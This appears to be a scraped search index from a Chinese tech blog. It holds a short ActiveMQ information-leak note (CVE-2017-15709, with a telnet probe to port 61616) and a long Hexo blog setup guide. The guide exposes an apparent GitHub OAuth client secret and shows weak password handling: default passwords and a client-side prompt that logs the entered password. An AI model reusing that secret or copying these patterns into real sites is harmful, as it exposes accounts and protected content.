Linux 3.10.0; CPE: cpe:/o:linux:linux_kernel:3.10.0 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds Apache ActiveMQ Information Leak-[CVE-2017-15709] Apache ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息,会返回应用名称，JVM，操作系统以及内核版本等信息。\ntelnet测试 telnet 10.184.67.53 61616 MSF相关漏洞模块 ","description":"","id":101,"section":"en","tags":null,"title":"ActiveMQ","uri":"http://crkmythical.github.io/en/blog/activemq/"},{"content":"[toc]\n通过pymusic-dl下载音乐 1 2  pip install pymusic-dl # 安装音乐模块 music-dl -k \u0026#34;\u0026lt;音乐名\u0026gt;\u0026#34; # 下载音乐    通过you-get下载视频 1 2 3  pip3 install you-get python3 -m pip install --upgrade you-get you-get \u0026#34;url\u0026#34; # 下载url内的视频   ","description":"","id":102,"section":"en","tags":[""],"title":"pythonic_tools","uri":"http://crkmythical.github.io/en/blog/pythonic-tools/"},{"content":"[toc]\n推荐博文：\n https://mp.weixin.qq.com/s/J4ghw2iWQTKoNynF3gIcPQ https://www.shangyang.me/2016/12/16/hexo-base-concept/ https://segmentfault.com/a/1190000021614307 https://juejin.cn/post/6844903805859921933  搭建过程 hexo 是一个快速、简洁且高效的博客框架。\nHexo安装 1 2 3 4 5  brew install git node # 安装git 和node npm config set registry https://registry.npm.taobao.org # 配置npm源 npm install -g hexo-cli # 安装hexo proxychains4 hexo init Mr-Framework # 初始化博客 git clone https://github.com/yelog/hexo-theme-3-hexo.git themes/3-hexo # 下载3-hexo主题   Hexo目录结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Mr-Framework├── _config.yml\t// 网站配置文件├── node_modules\t// npm依赖模块目录├── package-lock.json\t// node项目配置文件├── package.json\t// node项目配置文件├── scaffolds\t// 新建mardown文件模板目录│ ├── draft.md\t│ ├── page.md\t│ └── post.md\t├── source\t// 存放makrdown文件和图片│ └── _posts│ └── hello-world.md //hexo默认markdown文件└── themes\t//hexo主题目录└── 3-hexo├── LICENSE├── README.md├── _config.yml\t//主题配置文件├── languages\t//语言支持插件│ ├── en.yml│ └── zh-CN.yml├── layout\t//布局文件│ ├── _partial│ ├── index.ejs│ ├── indexs.md│ └── post.ejs└── source\t//主题源代码├── css├── img└── js  Hexo配置文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125  # Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Sitetitle:Mr.Framework #网站标题subtitle:\u0026#39;subtitle\u0026#39;#网站副标题description:\u0026#39;\u0026#39;#网站描述,主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词keywords:#网站的关键词,支持多个author:askDing #作者language:en #网站使用的语言timezone:\u0026#39;Asia/Shanghai\u0026#39;#时区，# URL## If your site is put in a subdirectory, set url as \u0026#39;http://example.com/child\u0026#39; and root as \u0026#39;/child/\u0026#39;url:https://askding.github.ioroot:/ # 网站根目录存放位置permalink::category/:title.html # 文章中的永久链接格式permalink_defaults:# 永久链接中的默认设置pretty_urls:trailing_index:true# Set to false to remove trailing \u0026#39;index.html\u0026#39; from permalinkstrailing_html:true# Set to false to remove trailing \u0026#39;.html\u0026#39; from permalinks# Directorysource_dir:source # 资源文件夹，存放内容的public_dir:public # 公共文件夹，用于存放生成的站点文件tag_dir:tags # 标签文件夹archive_dir:archives # 归档文件夹category_dir:categories # 分类文件夹code_dir:downloads/code # source_dir下的子目录,存放代码用的i18n_dir::lang # 国际化文件夹skip_render:# 跳过指定文件的渲染，匹配到文件将直接复制到public目录中# Writingnew_post_name::year-:month-:day-:title.md# File name of new postsdefault_layout:pagetitlecase:false# Transform title into titlecaseexternal_link:enable:true# Open external links in new tabfield:site# Apply to the whole siteexclude:\u0026#39;\u0026#39;filename_case:0render_drafts:falsepost_asset_folder:falserelative_link:falsefuture:truehighlight:enable:falseline_number:trueauto_detect:falsetab_replace:\u0026#39;\u0026#39;wrap:truehljs:falseprismjs:enable:falsepreprocess:trueline_number:truetab_replace:\u0026#39;\u0026#39;# Home page setting# path: Root path for your blogs index page. (default = \u0026#39;\u0026#39;)# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator:path:\u0026#39;\u0026#39;per_page:10order_by:-date# Category \u0026amp; Tagdefault_category:askDingcategory_map:tag_map:search:# 文章搜索path:search.xmlfield:_post# Metadata elements## https://developer.mozilla.org/en-US/docs/Web/HTML/Element/metameta_generator:true# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format:YYYY-MM-DDtime_format:HH:mm:ss## updated_option supports \u0026#39;mtime\u0026#39;, \u0026#39;date\u0026#39;, \u0026#39;empty\u0026#39;updated_option:\u0026#39;date\u0026#39;# Pagination## Set per_page to 0 to disable paginationper_page:10pagination_dir:page# Include / Exclude file(s)## include:/exclude: options only apply to the \u0026#39;source/\u0026#39; folderinclude:exclude:ignore:# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme:3-hexo## Plugins: http://hexo.io/plugins/#RSS订阅和sitemapplugin:- hexo-generator-feed- hexo-generator-feed- hexo-generator-sitemap#Feed Atomfeed:type:atompath:atom.xmllimit:20# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:type:\u0026#39;git\u0026#39;repository:https://github.com/askDing/askDing.github.io.gitbranch:master  主题配置 hexo的主题仓库点击此处\n推荐的博客主题 3-hexo、Arknights 、 freemind.bithack\n Mr-Framework/themes/3-hexo/_config.yml\n 基础配置 UI颜色配置  Mr-Framework/themes/3-hexo/source/css/_partial/nav-right.styl\n 1 2 3 4 5 6 7 8 9 10 11 12 13  .nav-right width 420px height 100% background #F2F1D7 /* 柔黄色 */ border-right 1px solid #e5e8ec overflow hidden float left position relative -webkit-user-select none -moz-user-select none -ms-user-select none -o-user-select none user-select none    Mr-Framework/themes/3-hexo/source/css/_partial/post.styl\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  #post height 100% font-weight: 350; font-size: 14px; line-height 1.55 background #E8FFE8 /* 浅绿色 */ overflow-x hidden overflow-y auto -webkit-overflow-scrolling touch font-family -apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif color #2f2f2f margin-left 1px article padding 1em /* 内容间隔1em */ background #E8FFE8 .article-entry\u0026gt;p:nth-child(1) margin-top 20px .copyright margin-top 50px padding-bottom 30px background #E8FFE8 /* 版权浅绿色 */ line-height 14px text-align center color #BCC1C4   Gitalk评论背景颜色  /Mr-Framework/themes/3-hexo/source/css/_partial/comment.styl\n 1 2 3 4 5 6 7 8 9 10 11 12  #comments padding 2.5em background #e8ffe8 /* 评论区背景颜色 */ .comment-bar display block cursor pointer background rgba(255,255,255,0.3) padding 0.5rem -webkit-box-shadow 3px 2px 8px rgba(0,0,0,0.07) box-shadow 3px 2px 8px rgba(0,0,0,0.07) text-align center font-size 2rem   头像配置  图片存放在 Mr-Framework/themes/3-hexo/source/img/\n 1 2  avatar:/img/avatar.pngfavicon:/img/avatar.png  联系链接配置 1 2 3 4 5 6 7  ink:theme: color # 链接样式，color: 彩色图标 white:黑白图标items:rss:/atom.xmlgithub:https://github.com/askDingemail:askding@qq.comqq:741474596  文章分类设置 1 2 3 4 5 6 7  category:num:true# 分类显示文章数sub:true# 开启多级分类sort:- Cyber Security- aaa- bb  左下角自定义菜单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  menu:about:# \u0026#39;关于\u0026#39; 按钮on:true# 是否显示url:/about # 跳转链接type:1# 跳转类型 1：站内异步跳转 2：当前页面跳转 3：打开新的tab页friend:# \u0026#39;友链\u0026#39; 按钮on:true# 是否展示menus:# 添加的其他菜单写在 menus 下，如下三个菜单：动态菜单1、动态菜单2、动态菜单3相册:on:falseurl:/phototype:1# 跳转类型 1：站内异步跳转叶落阁:on:falseurl:http://yelog.org/type:2# 跳转类型 2：当前页面跳转github:on:falseurl:https://github.com/yelogtype:3# 跳转类型 3：打开新的tab页  文末声明 1 2 3 4 5 6 7 8 9 10 11 12 13  # 文末声明article_txt:转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.combottom_text:©1996-2020 Mr.Framework# 自定义页面最下方的站点版权信息# 如果不填，则自定义为 ©2017 author (这个author为hexo根目录_config.yml中配置的)# 底部备案号miit:on:falseinfo:京ICP证030173号url:http://beian.miit.gov.cn/# 默认链接为 http://beian.miit.gov.cn/  左侧导航宽度  Mr-Framework/themes/3-hexo/source/css/_partial/nav-left.styl\n 1 2 3 4 5 6 7 8 9 10 11 12  .nav-left width 130px /* 左侧导航宽度 130px */ height 100% background #2A2935 box-shadow inset -15px 0 15px -15px #222 float left position relative -webkit-user-select none -moz-user-select none -ms-user-select none -o-user-select none user-select none   不蒜子网站计数配置 1 2 3 4 5 6 7  # 不蒜子网站计数设置# http://ibruce.info/2015/04/04/busuanzi/visit_counter:on:truesite_visit:truepage_visit:true  代码高亮配置  禁用网站配置文件里的代码高亮设置   Mr-Framework/_config.yml\n 1 2 3 4 5 6 7  highlight:enable:false/* 禁用代码高亮 */line_number:trueauto_detect:falsetab_replace:\u0026#39;\u0026#39;wrap:truehljs:false  启用主题配置文件里的代码高亮   Mr-Framework/themes/3-hexo/_config.yml\n 1 2 3 4 5  highlight:on:true# true开启代码高亮，开启需要关闭博客 _config.yml 中的 highlightlineNum:false# true显示行号copy:true# 复制功能theme:gruvbox-dark  高级配置 MathJax数学公式 修改 _config.yml\n1 2 3 4 5  # MathJax 数学公式支持mathjax:on:true#是否启用per_page: false # 若只渲染单个页面，此选项设为false，页面内加入 mathjax:trueyaml复制代码  考虑到页面的加载速度，支持渲染单个页面。\n设置 per_page: false ,在需要渲染的页面内 加入 mathjax: true\n 注意:\n由于hexo的MarkDown渲染器与MathJax有冲突，可能会造成矩阵等使用不正常。所以在使用之前需要修改两个地方\n编辑 node_modules\\marked\\lib\\marked.js 脚本\n  将451行 ，这一步取消了对 \\\\,\\{,\\} 的转义(escape)  1 2 3  escape: /^\\\\([\\\\`*{}\\[\\]()# +\\-.!_\u0026gt;])/, 改为 escape: /^\\\\([`*\\[\\]()# +\\-.!_\u0026gt;])/,   将459行，这一步取消了对斜体标记 _的转义  1 2 3  em: /^\\b_((?:[^_]|__)+?)_\\b|^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)/, 改为 em:/^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)/,   添加Mermaid图标 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ##\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;在网站配置文件中Mr-Framework/_config.yml添加如下内容 \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;### # Mermaid 支持 mermaid: on: true cdn: //cdn.jsdelivr.net/npm/mermaid@8.4.2/dist/mermaid.min.js #cdn: //cdnjs.cloudflare.com/ajax/libs/mermaid/8.3.1/mermaid.min.js options: # 更多配置信息可以参考 https://mermaidjs.github.io/#/mermaidAPI theme: \u0026#39;default\u0026#39; startOnLoad: true flowchart: true useMaxWidth: false htmlLabels: true ##\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;命令行安装hexo-filter-mermaid-diagrams插件 \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;### npm install hexo-filter-mermaid-diagrams   字数统计 1 2 3 4  word_count: false # true 开启字数统计 # 开启此功能需要安装插件 ：在 hexo根目录 执行 npm install hexo-wordcount   配置思维导图 1 2 3 4 5 6 7 8 9 10 11 12 13  npm install hexo-simple-mindmap # 安装思维导图插件 在markdown中按照如下格式输写 {% pullquote mindmap mindmap-md %} - [在 Hexo 中使用思维导图](https://hunterx.xyz/use-mindmap-in-hexo.html) - 前言 - 操作指南 - 准备需要的文件 - 为主题添加 CSS/JS 文件 - 使用方法 {% endpullquote %}   全文搜索 1 2 3 4 5 6 7 8 9  searchAll: ture # true 启用全文搜索 # 开启此功能需要下面操作： # 1. 在 hexo 根目录 执行 npm install hexo-generator-search --save 安装插件 # 2. 在 hexo 根目录的 _config.xml 中添加下面内容 # search: # path: search.xml # field: post npm install hexo-generator-search   添加RSS和Sitemap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ##\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;在网站配置文件中Mr-Framework/_config.yml添加如下内容 \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;##### Plugins: http://hexo.io/plugins/#RSS订阅和sitemapplugin:- hexo-generator-feed- hexo-generator-sitemap#Feed Atomfeed:type:atompath:atom.xmllimit:20##### 在主题配置文件中Mr-Framework/themes/3-hexo/_config.yml添加如下内容 \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;######link:theme: color # 链接样式，color: 彩色图标 white:黑白图标items:rss:/atom.xml  1  npm install hexo-generator-feed hexo-generator-sitemap   提交sitemap到Google站点平台\n下载这个html文件，到网站仓库上传这个html文件点击VERIFY\n添加站点文件sitemap.xml\n添加建站时间 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  \u0026lt;!-- 添加建站时间代码到Mr-Framework/themes/3-hexo/layout/_partial/footer.ejs文件末尾 --\u0026gt; \u0026lt;script language=javascript\u0026gt; function siteTime() { window.setTimeout(\u0026#34;siteTime()\u0026#34;, 1000); var seconds = 1000; var minutes = seconds * 60; var hours = minutes * 60; var days = hours * 24; var years = days * 365; var today = new Date(); var todayYear = today.getFullYear(); var todayMonth = today.getMonth() + 1; var todayDate = today.getDate(); var todayHour = today.getHours(); var todayMinute = today.getMinutes(); var todaySecond = today.getSeconds(); /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳) year - 作为date对象的年份，为4位年份值 month - 0-11之间的整数，做为date对象的月份 day - 1-31之间的整数，做为date对象的天数 hours - 0(午夜24点)-23之间的整数，做为date对象的小时数 minutes - 0-59之间的整数，做为date对象的分钟数 seconds - 0-59之间的整数，做为date对象的秒数 microseconds - 0-999之间的整数，做为date对象的毫秒数 */ var t1 = Date.UTC(2020, 12, 05, 00, 00, 00); //北京时间2020-12-05 00:00:00  var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond); var diff = t2 - t1; var diffYears = Math.floor(diff / years); var diffDays = Math.floor((diff / days) - diffYears * 365); var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours); var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes); var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds); document.getElementById(\u0026#34;sitetime\u0026#34;).innerHTML = \u0026#34;本站已运行 \u0026#34; +diffYears+\u0026#34; 年 \u0026#34;+diffDays + \u0026#34; 天 \u0026#34; + diffHours + \u0026#34; 小时 \u0026#34; + diffMinutes + \u0026#34; 分钟 \u0026#34; + diffSeconds + \u0026#34; 秒\u0026#34;; }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/ siteTime(); \u0026lt;/script\u0026gt;   然后在合适的地方（比如copyright声明后面）加上下面的代码就行了：\n Mr-Framework/themes/3-hexo/layout/indexs.md文件中添加如下代码\n 1  \u0026lt;span id=\u0026#34;sitetime\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;   添加百度统计和谷歌统计代码-不适用 打开themes/matery/layout/_partial/head.ejs，修改下面两行：\n1 2  \u0026lt;meta name=\u0026#34;baidu-site-verification\u0026#34; content=\u0026#34;fmlEuI34ir\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;google-site-verification\u0026#34; content=\u0026#34;yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48\u0026#34; /\u0026gt;   其中content内容改成你自己的就行了。\n图片添加水印-未适用 为了防止别人抄袭你文章，可以把所有的图片都加上水印，方法很简单。\n首先在博客根目录下新建一个watermark.py，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # -*- coding: utf-8 -*- import sys import glob from PIL import Image from PIL import ImageDraw from PIL import ImageFont def watermark(post_name): if post_name == \u0026#39;all\u0026#39;: post_name = \u0026#39;*\u0026#39; dir_name = \u0026#39;source/_posts/\u0026#39; + post_name + \u0026#39;/*\u0026#39; for files in glob.glob(dir_name): im = Image.open(files) if len(im.getbands()) \u0026lt; 3: im = im.convert(\u0026#39;RGB\u0026#39;) print(files) font = ImageFont.truetype(\u0026#39;STSONG.TTF\u0026#39;, max(30, int(im.size[1] / 20))) draw = ImageDraw.Draw(im) draw.text((im.size[0] / 2, im.size[1] / 2), u\u0026#39;@yourname\u0026#39;, fill=(0, 0, 0), font=font) im.save(files) if __name__ == \u0026#39;__main__\u0026#39;: if len(sys.argv) == 2: watermark(sys.argv[1]) else: print(\u0026#39;[usage] \u0026lt;input\u0026gt;\u0026#39;)   字体也放根目录下，自己找字体。然后每次写完一篇文章可以运行python3 watermark.py postname添加水印，如果第一次运行要给所有文章添加水印，可以运行python3 watermark.py all。\n404页面  进入 Hexo 所在文件夹，输入 hexo new page 404 ; 打开刚新建的页面文件，默认在 Hexo 文件夹根目录下 /source/404/index.md； 在顶部插入一行，写上 permalink: /404，这表示指定该页固定链接为 http://\u0026quot;主页\u0026quot;/404.html  --- title: 404 permalink: /404 date: 2016-09-27 11:31:01 --- --- ## 页面未找到！ About/Resume页面  修改主题配置文件Mr-Framework/themes/3-hexo/source/config.yml\n 1 2 3 4 5 6 7 8  menu:about:# \u0026#39;关于\u0026#39; 按钮on:true# 是否显示url:/about # 跳转链接type:1# 跳转类型 1：站内异步跳转 2：当前页面跳转 3：打开新的tab页# 在终端内运行hexo new page about #在source目录下创建/source/about/index.md 编辑index.md即可  添加音乐插件 生成外链代码 在网易云音乐 搜索一个作为背景音乐的歌曲，并进入播放页面，点击 生成外链播放器\n插入js脚本 给在第6步的外链代码进行优化如下，在**/Mr-Framework/themes/3-hexo/layout/_partial/footer.ejs**末尾添加下列代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  \u0026lt;div id=\u0026#34;musicMouseDrag\u0026#34; style=\u0026#34;position:fixed; z-index: 9999; bottom: 0; right: 0;\u0026#34;\u0026gt; \u0026lt;!--默认style是底部bottom,右下角right --\u0026gt; \u0026lt;div id=\u0026#34;musicDragArea\u0026#34; style=\u0026#34;position: absolute; top: 0; left: 0; width: 100%;height: 10px;cursor: move; z-index: 10;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!--网易云外链放在此处--\u0026gt; \u0026lt;iframe frameborder=\u0026#34;no\u0026#34; border=\u0026#34;0\u0026#34; marginwidth=\u0026#34;0\u0026#34; marginheight=\u0026#34;0\u0026#34; width=150 height=40 src=\u0026#34;//music.163.com/outchain/player?type=2\u0026amp;id=1373296\u0026amp;auto=1\u0026amp;height=32\u0026#34;\u0026gt; \u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!--以下代码是为了支持随时拖动音乐控件的位置，如没有需求，可去掉下面代码--\u0026gt; \u0026lt;!--但是好像不能用 --\u0026gt; \u0026lt;script\u0026gt; var $DOC = $(document) $(\u0026#39;#musicMouseDrag\u0026#39;).on(\u0026#39;mousedown\u0026#39;, function (e) { // 阻止文本选中 $DOC.bind(\u0026#34;selectstart\u0026#34;, function () { return false; }); $(\u0026#39;#musicDragArea\u0026#39;).css(\u0026#39;height\u0026#39;, \u0026#39;100%\u0026#39;); var $moveTarget = $(\u0026#39;#musicMouseDrag\u0026#39;); $moveTarget.css(\u0026#39;border\u0026#39;, \u0026#39;1px dashed grey\u0026#39;) var div_x = e.pageX - $moveTarget.offset().left; var div_y = e.pageY - $moveTarget.offset().top; $DOC.on(\u0026#39;mousemove\u0026#39;, function (e) { var targetX = e.pageX - div_x; var targetY = e.pageY - div_y; targetX = targetX \u0026lt; 0 ? 0 : (targetX + $moveTarget.outerWidth() \u0026gt;= window.innerWidth) ? window.innerWidth - $moveTarget.outerWidth() : targetX; targetY = targetY \u0026lt; 0 ? 0 : (targetY + $moveTarget.outerHeight() \u0026gt;= window.innerHeight) ? window.innerHeight - $moveTarget.outerHeight() : targetY; $moveTarget.css({\u0026#39;left\u0026#39;: targetX + \u0026#39;px\u0026#39;, \u0026#39;top\u0026#39;: targetY + \u0026#39;px\u0026#39;, \u0026#39;bottom\u0026#39;: \u0026#39;inherit\u0026#39;, \u0026#39;right\u0026#39;: \u0026#39;inherit\u0026#39;}) }).on(\u0026#39;mouseup\u0026#39;, function () { $DOC.unbind(\u0026#34;selectstart\u0026#34;); $DOC.off(\u0026#39;mousemove\u0026#39;) $DOC.off(\u0026#39;mouseup\u0026#39;) $moveTarget.css(\u0026#39;border\u0026#39;, \u0026#39;none\u0026#39;) $(\u0026#39;#musicDragArea\u0026#39;).css(\u0026#39;height\u0026#39;, \u0026#39;10px\u0026#39;); }) }) \u0026lt;/script\u0026gt;   给博文加密🔐-hexo-blog-encrypt-功能暂未配置正确 安装hexo-blog-encrypt插件 1  npm install hexo-blog-encrypt   网站根目录下的_config.yml文件配置，添加如下字段 1 2 3 4 5 6 7 8 9 10 11  # Securityencrypt:# hexo-blog-encryptabstract:有东西被加密了, 请输入密码查看.message:您好, 这里需要密码.tags:- {name: tagName, password:密码A}- {name: tagName, password:密码B}template:\u0026lt;div id=\u0026#34;hexo-blog-encrypt\u0026#34; data-wpm=\u0026#34;{{hbeWrongPassMessage}}\u0026#34; data-whm=\u0026#34;{{hbeWrongHashMessage}}\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;hbe-input-container\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;hbePass\u0026#34; placeholder=\u0026#34;{{hbeMessage}}\u0026#34; /\u0026gt;\u0026lt;label\u0026gt;{{hbeMessage}}\u0026lt;/label\u0026gt;\u0026lt;div class=\u0026#34;bottom-line\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script id=\u0026#34;hbeData\u0026#34; type=\u0026#34;hbeData\u0026#34; data-hmacdigest=\u0026#34;{{hbeHmacDigest}}\u0026#34;\u0026gt;{{hbeEncryptedData}}\u0026lt;/script\u0026gt;\u0026lt;/div\u0026gt;wrong_pass_message:抱歉, 这个密码看着不太对, 请再试试.wrong_hash_message:抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.silent:true# 禁用日志输出  博文front-matter配置 1 2 3 4 5 6 7 8 9 10 11  --- title: Hello World tags: - 作为日记加密 date: 2016-03-30 21:12:21 password: mikemessi abstract: 有东西被加密了, 请输入密码查看. message: 您好, 这里需要密码. wrong_pass_message: 抱歉, 这个密码看着不太对, 请再试试. wrong_hash_message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容. ---   禁用tag加密🔐 1 2 3 4 5 6 7 8 9  --- title: Callback Test date: 2019-12-21 11:54:07 tags: - A Tag should be encrypted password: \u0026#34;\u0026#34; --- Use a \u0026#34;\u0026#34; to diable tag encryption.   禁用标签tag加密配置 在md文章中front-matter中设置如下\n1 2 3 4 5 6 7 8  ---title:Callback Testdate:2019-12-21 11:54:07tags:- A Tag should be encryptedpassword:\u0026#34;\u0026#34;---Use a \u0026#34;\u0026#34; to diable tag encryption.  给博文加密🔐-hexo-encrypt-正常配置 安装hex-encrypt 1  npm install hexo-encrypt # 安装hexo-encrypt依赖包   配置站点配置文件  Mr-Framework/_config.yml 新增如下字段\n 1 2  encrypt:password:123456# 默认密码  博文头部front-matter配置 1 2 3 4 5 6  --- encrypt: true enc_pwd: 123 --- enc_pwd不写，则是默认配置文件里的123456密码   加密界面微调 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  /*** Mr-Framework/node_modules/hexo-encrypt/lib/conf_post.js ***/ if (this.template == undefined || this.template == \u0026#39;\u0026#39;) { this.template = \u0026#39; \u0026lt;input id=\u0026#34;enc_pwd_input\u0026#34; type=\u0026#34;password\u0026#34; style=\u0026#34;\u0026#39; + \u0026#39;border-radius: 5px;\u0026#39; + \u0026#39;background-color: white;\u0026#39; + /* 密码输入框背景颜色 浅绿色 #E8FFE8 */ \u0026#39;border-style: groove;\u0026#39; + \u0026#39;height: 30px;\u0026#39; + \u0026#39;width: 50%;\u0026#39; + \u0026#39;cursor: auto;\u0026#39; + \u0026#39;font-size: 102%;\u0026#39; + \u0026#39;color: currentColor;\u0026#39; + /* 密文字体*的颜色 默认为currentColor */ \u0026#39;outline: none;\u0026#39; + \u0026#39;text-overflow: initial;\u0026#39; + \u0026#39;padding-left: 5px;\u0026#34; onkeydown=\u0026#34;if (event.keyCode == 13) { decrypt(); return false;}\u0026#34;\u0026gt; \u0026#39; + \u0026#39;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;解\u0026amp;nbsp;密\u0026#34; onclick=\u0026#34;decrypt()\u0026#34; style=\u0026#34;\u0026#39; + \u0026#39;width: 58px;\u0026#39; + \u0026#39;height: 34px;\u0026#39; + \u0026#39;border-radius: 5px;\u0026#39; + \u0026#39;background-color: #32414e;\u0026#39; + /* 提交按钮背景颜色 */ \u0026#39;border-style: solid;\u0026#39; + \u0026#39;color: white;\u0026#39; + /* 字体的颜色 默认为currentColor */ \u0026#39;\u0026#34;\u0026gt;\u0026#39; + \u0026#39;\u0026lt;div id=\u0026#34;enc_error\u0026#34; style=\u0026#34;\u0026#39; + \u0026#39;display: inline-block;\u0026#39; + \u0026#39;color: #d84527;\u0026#39; + \u0026#39;margin-left: 10px\u0026#39; + \u0026#39;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\\n\u0026#39; + \u0026#39;\u0026lt;script\u0026gt;\\n\u0026#39; + \u0026#39;var onError = function(error) {\\n\u0026#39; + \u0026#39;\tdocument.getElementById(\u0026#34;enc_error\u0026#34;).innerHTML = \u0026#34;password error!\u0026#34;\\n\u0026#39; + \u0026#39;};\\n\u0026#39; + \u0026#39;function decrypt() {\\n\u0026#39; + \u0026#39;var passwd = document.getElementById(\u0026#34;enc_pwd_input\u0026#34;).value;\\n\u0026#39; + \u0026#39;console.log(passwd);\\n\u0026#39; + \u0026#39;doDecrypt(passwd, onError);\\n\u0026#39; + \u0026#39;}\\n\u0026#39; + \u0026#39;\u0026lt;/script\u0026gt;\\n\u0026#39;; }   手动添加js代码实现博文加密加密 1 2 3 4 5 6 7 8 9 10 11 12  /* 在Mr-Framework/themes/3-hexo/layout/_partial/header.ejs末尾添加如下js脚本 */ #JavaScript \u0026lt;script\u0026gt; (function(){ if(\u0026#39;{{ page.password }}\u0026#39;){ if (prompt(\u0026#39;请输入密码\u0026#39;) !== \u0026#39;{{ page.password }}\u0026#39;){ alert(\u0026#39;密码错误\u0026#39;); history.back(); } } })(); \u0026lt;/script\u0026gt;   评论系统gitalk配置 注册OAuth Application 点击此处 来注册一个新的 OAuth Application。\n修改主题配置文件  /Mr-Framework/themes/3-hexo/_config.yml\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ##########评论设置#############comment:on:truetype:gitalk # 评论系统：gitalk、disqus、gitment、utteranc、livere,注意：使用时，在下方对应位置进行配置comment_count:true# 文章标题下方显示评论数 目前仅支持 gitalk 和 disqus## 使用说明 https://yelog.org//2020/05/23/3-hexo-comment/# 各评论系统配置 ↓↓gitalk:githubID: askDing # githubID:github用户名repo: askDing.github.io # repo:使用哪个仓库的issueClientID:3675559917bdc294608c # 创建 OAuth application 就会生成：ClientSecret:a826e0ded6d8b29a5bb77843f4c3805ecf7b263f # 创建 OAuth application 就会生成adminUser:askDing# 使用自己的 github 用户名即可 distractionFreeMode:true# 全屏遮罩效果language:zh-CN # 支持：en / zh-CN / zh-TW 三种perPage:10# 每次加载的数据大小，默认10，最大100  1  npm install gitalk # 安装gitalk模块   更多评论配置请查看叶落阁\n部署 Github部署 配置deploy 1 2 3 4 5 6  # Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:type:\u0026#39;git\u0026#39;repository:https://github.com/askDing/askDing.github.io.gitbranch:master  1 2  npm install hexo-deployer-git. # 安装git部署插件 hexo d # 部署到github   备份博客 1 2 3 